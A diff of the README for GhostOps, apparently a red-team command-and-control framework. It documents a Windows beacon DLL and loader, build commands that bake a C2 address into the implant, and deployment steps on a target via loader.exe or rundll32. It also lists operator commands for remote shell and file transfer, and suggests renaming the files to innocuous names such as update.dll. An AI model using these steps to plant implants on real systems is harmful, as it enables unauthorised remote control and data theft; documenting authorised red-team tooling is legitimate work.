@@ -1,8 +1,29 @@
-# GhostOps
+```
+┏┓┓     ┏┓
+┃┓┣┓┏┓┏╋┃┃┏┓┏
+┗┛┛┗┗┛┛┗┗┛┣┛┛
+          ┛
+  A lightweight C2 framework for authorized red team engagements.
+```
 
-A lightweight Command and Control Framework for authorized red team engagements and security research.
+> **Legal** — For authorized security assessments and educational research only.
+> Use against systems without explicit written permission is illegal.
+> The authors accept no liability for misuse.
 
-> **Legal notice** — For authorized security assessments and educational research only. Use against systems without explicit written permission is illegal. The authors accept no liability for misuse.
+---
+
+## Features
+
+| Capability | Detail |
+|---|---|
+| Persistent shell | Stateful `cmd.exe` session — env vars, CWD preserved across tasks |
+| File transfer | Upload and download with base64 transport |
+| Host profiling | OS, arch, integrity level, adapters, domain info on check-in |
+| Sleep / jitter | Configurable interval with percentage jitter |
+| TLS | Self-signed cert auto-generated at startup; BYO cert supported |
+| Auth | API key required on all operator connections |
+| Persistence | Optional JSON store — survives server restarts |
+| Logging | Tee stdout to file with `-log` |
 
 ---
 
@@ -10,85 +31,131 @@ A lightweight Command and Control Framework for authorized red team engagements 
 
 | | Language | Output | Role |
 |---|---|---|---|
-| `beacon/` | C | `beacon.dll` | Windows implant |
-| `server/` | Go | `server` | C2 listener + operator API |
+| `beacon/` | C (mingw) | `beacon.dll` | Windows implant |
+| `loader/` | C (mingw) | `loader.exe` | Drops and executes the beacon DLL |
+| `server/` | Go | `server` | TLS C2 listener + operator API |
 | `client/` | Go | `client` | Operator REPL |
 
 ---
 
-## Prerequisites
+## Requirements
 
 ```bash
-# Cross-compiler for the beacon (Debian/Ubuntu)
+# Debian / Ubuntu — cross-compiler for Windows targets
 sudo apt install mingw-w64
 
-# Go 1.21+  →  https://go.dev/dl/
+# Go 1.21+
+# https://go.dev/dl/
 ```
 
 ---
 
-## Build
+## Building
 
 ```bash
 # Server and client
 make
 
-# Beacon — host/port baked in at compile time
+# Beacon DLL — C2 host and port are baked in at compile time
 make beacon BEACON_HOST=<ip> BEACON_PORT=<port>
 
-# Example
-make beacon BEACON_HOST=10.10.14.5 BEACON_PORT=8080
+# Loader EXE — loads beacon.dll from the same directory
+make loader
+
+# Full implant build example
+make beacon loader BEACON_HOST=10.10.14.5 BEACON_PORT=443
 ```
 
-Artifacts: `build/server`, `build/client`, `build/beacon.dll`
+Artifacts land in `build/`:
+
+```
+build/
+├── server
+├── client
+├── beacon.dll
+└── loader.exe
+```
+
+> **Note** — Rename `loader.exe` and `beacon.dll` to matching names before deployment.
+> The loader resolves the DLL by name at runtime (`beacon.dll` by default).
+> Override at compile time: `make loader BEACON_DLL=update.dll`
 
 ---
 
-## Usage
+## Quickstart
 
-**1. Start the server**
+**1 — Start the server**
 
-```bash
-./build/server
-# Optional flags:
-#   -c2-host   bind address for beacon traffic  (default 0.0.0.0)
-#   -c2-port   port for beacon traffic          (default 8080)
-#   -op-host   bind address for operator API    (default 127.0.0.1)
-#   -op-port   port for operator API            (default 9090)
-#   -log       path to log file                 (tee to stdout + file)
+```
+$ ./build/server
+
+┏┓┓     ┏┓
+┃┓┣┓┏┓┏╋┃┃┏┓┏
+┗┛┛┗┗┛┛┗┗┛┣┛┛
+          ┛
+
+  HTTPS Listener  0.0.0.0:443
+  Operator API    127.0.0.1:9090
+  API Key         a3f8c1d2e4b5f6a7c8d9e0f1a2b3c4d5
 ```
 
-**2. Deploy the beacon** on the target (requires `BeaconMain` export)
+Optional flags:
 
-```cmd
+```
+-c2-host   C2 bind address      (default 0.0.0.0)
+-c2-port   C2 port              (default 443)
+-op-host   Operator bind        (default 127.0.0.1)
+-op-port   Operator port        (default 9090)
+-api-key   Static API key       (auto-generated if omitted)
+-tls-cert  TLS certificate PEM  (auto-generated if omitted)
+-tls-key   TLS private key PEM  (auto-generated if omitted)
+-store     Persistence file     (in-memory only if omitted)
+-log       Log file path        (stdout only if omitted)
+```
+
+**2 — Deploy the implant** on the target
+
+```
+loader.exe          # executes beacon.dll from the same directory
+```
+
+Or directly via rundll32:
+
+```
 rundll32.exe beacon.dll,BeaconMain
 ```
 
-**3. Connect with the client**
+**3 — Connect with the client**
 
-```bash
-./build/client
-# Optional flags:
-#   -server  operator API address  (default http://127.0.0.1:9090)
+```
+$ ./build/client -key a3f8c1d2e4b5f6a7c8d9e0f1a2b3c4d5
+```
+
+Optional flags:
+
+```
+-host   Operator API host  (default 127.0.0.1)
+-port   Operator API port  (default 9090)
+-key    API key            (required)
 ```
 
 ---
 
-## Operator commands
+## Operator Commands
 
 ```
-beacons                   list all active beacons
-use <id>                  select a beacon
-info                      show full beacon details
-shell <cmd>               run a shell command
-sleep <ms> [jitter%]      change sleep interval
-kill                      terminate the beacon
-download <remote> [local] pull a file from the target
-upload <local> <remote>   push a file to the target
-tasks [-a]                show task results  (-a = all, default = new only)
-back                      deselect beacon
-help                      show this list
-exit                      quit
+beacons                     list all active beacons
+use <id>                    select a beacon by ID
+info                        show full beacon detail
+shell <cmd>                 run a shell command (persistent session)
+sleep <ms> [jitter%]        update sleep interval
+kill                        terminate the beacon process
+download <remote> [local]   pull a file from the target
+upload <local> <remote>     push a file to the target
+tasks [-a]                  show results  (-a = all, default = unseen only)
+back                        deselect beacon
+help                        show command list
+exit                        quit
 ```
 
 ---
@@ -96,50 +163,52 @@ exit                      quit
 ## Architecture
 
 ```
-Operator REPL
-    │
-    │ HTTP :9090 (operator API)
-    ▼
-┌─────────────────────────────────────┐
-│  server                             │
-│  ├── C2 listener      :8080         │
-│  │   POST /checkin                  │
-│  │   GET  /tasks/<id>               │
-│  │   POST /result                   │
-│  └── Operator API     :9090         │
-│      GET  /beacons[/<id>]           │
-│      POST /task                     │
-│      GET  /results/<id>             │
-└─────────────────┬───────────────────┘
-                  │ HTTP :8080 (C2)
-                  ▼
-┌─────────────────────────────────────┐
-│  beacon.dll (target host)           │
-│  ├── context.c   host profiling     │
-│  ├── checkin.c   initial check-in   │
-│  ├── loop.c      sleep / poll       │
-│  ├── tasks.c     task dispatch      │
-│  ├── shell.c     persistent shell   │
-│  └── file.c      file transfer      │
-└─────────────────────────────────────┘
+Operator
+   │
+   │  HTTPS + API key  (:9090)
+   ▼
+┌──────────────────────────────────────┐
+│  server                              │
+│  ├── C2  listener  :443  (HTTPS)     │
+│  │     POST /checkin                 │
+│  │     GET  /tasks/<id>              │
+│  │     POST /result                  │
+│  └── Operator API  :9090 (HTTPS)     │
+│        GET  /beacons[/<id>]          │
+│        POST /task                    │
+│        GET  /results/<id>            │
+└────────────────┬─────────────────────┘
+                 │  HTTPS  (:443)
+                 ▼
+┌──────────────────────────────────────┐
+│  loader.exe → beacon.dll             │
+│  ├── context.c    host profiling     │
+│  ├── checkin.c    initial check-in   │
+│  ├── loop.c       sleep / poll       │
+│  ├── tasks.c      task dispatch      │
+│  ├── shell.c      persistent shell   │
+│  └── file.c       file transfer      │
+└──────────────────────────────────────┘
 ```
 
 ---
 
-## Project structure
+## Project Structure
 
 ```
 .
 ├── beacon/
 │   ├── include/beacon.h      shared types and declarations
 │   └── src/
-│       ├── main.c            DLL entry point
+│       ├── main.c            DLL entry point (BeaconMain export)
 │       ├── context.c         host profiling
-│       ├── checkin.c         HTTP check-in
-│       ├── loop.c            sleep / poll loop
+│       ├── checkin.c         HTTPS check-in
+│       ├── loop.c            sleep / poll loop with jitter
 │       ├── tasks.c           task polling, JSON parsing, dispatch
 │       ├── shell.c           persistent cmd.exe pipe
 │       └── file.c            base64 file upload / download
+├── loader/
+│   └── main.c               LoadLibrary + GetProcAddress stub
 ├── client/
 │   ├── main.go
 │   └── internal/
@@ -148,24 +217,37 @@ Operator REPL
 │       ├── models/           shared data models
 │       └── repl/             REPL loop and command handlers
 ├── server/
-│   ├── main.go               dual-listener setup
-│   ├── banner/               startup banner
+│   ├── main.go              TLS setup, auth middleware, dual listeners
+│   ├── banner/              startup banner
 │   ├── handlers/
-│   │   ├── c2.go             beacon-facing endpoints
-│   │   └── operator.go       operator-facing endpoints
+│   │   ├── c2.go            beacon-facing endpoints
+│   │   └── operator.go      operator-facing endpoints
 │   └── store/
-│       └── store.go          beacon store, task queues, result history
+│       └── store.go         beacon store, task queues, persistence
 ├── Makefile
 └── README.md
 ```
 
 ---
 
-## Known limitations
+## Known Limitations
 
-- No TLS — C2 traffic is plaintext HTTP
-- No operator authentication
-- In-memory store only — state is lost on server restart
-- No evasion (AMSI/ETW patching, sleep obfuscation, EDR unhooking, etc.)
+GhostOps Community is intentionally scoped. The following are not implemented:
+
+- Encrypted / malleable HTTP profiles
+- Sleep obfuscation or in-memory evasion
+- AMSI / ETW patching
+- EDR unhooking or process injection
+- SOCKS5 proxy / pivoting
+- Native `ps` / `ls` (use `shell tasklist` / `shell dir`)
+- Multi-operator session isolation
+- BOF (Beacon Object File) support
 
 Detection by a mature EDR or monitored network should be expected.
+Advanced capabilities are available in **GhostOps Pro**.
+
+---
+
+## Author
+
+**4w4647** — built for the community. Use responsibly.
